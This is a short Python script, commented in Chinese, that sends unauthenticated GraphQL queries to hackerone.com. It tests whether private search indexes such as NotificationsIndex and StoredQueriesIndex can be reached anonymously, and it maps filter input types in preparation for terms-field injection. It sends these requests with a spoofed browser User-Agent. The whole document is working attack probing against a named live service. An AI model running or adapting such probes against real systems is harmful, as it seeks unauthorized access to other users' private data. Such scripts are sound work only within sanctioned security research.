# -*- coding: utf-8 -*-
"""T1e:ES index 越权 + terms field 注入(2026-09-08,匿名)"""
import requests
import json
import time

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
S = requests.Session()
S.headers.update({"User-Agent": UA})

def gql(query, label, ms=20000):
    try:
        r = S.post("https://hackerone.com/graphql", json={"query": query}, timeout=ms)
        print(f"== {label}: {r.status_code} {r.text[:1600]}")
    except Exception as e:
        print(f"== {label} ERR {e}")

# 1. 其它 index 匿名可达性(核心:NotificationsIndex 私有!)
for idx in ["NotificationsIndex", "StoredQueriesIndex", "OpportunitiesIndex", "DuplicateDetectorReportsIndex"]:
    gql('{ search(index: %s, query_string: "a", first: 1){ total_count } }' % idx, "idx_%s" % idx)
    time.sleep(0.3)

# 2. input 结构(≤3 个别名)
gql("""{ a:__type(name:"TermsFilterInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } }
b:__type(name:"RangeInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } }
c:__type(name:"NestedInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } } }""", "inputs1")
time.sleep(0.3)
gql("""{ d:__type(name:"BoolQueryInput"){ inputFields{ name type{ kind name ofType{ kind name ofType{ kind name } } } } }
e:__type(name:"HacktivityDocument"){ fields{ name } } }""", "inputs2")
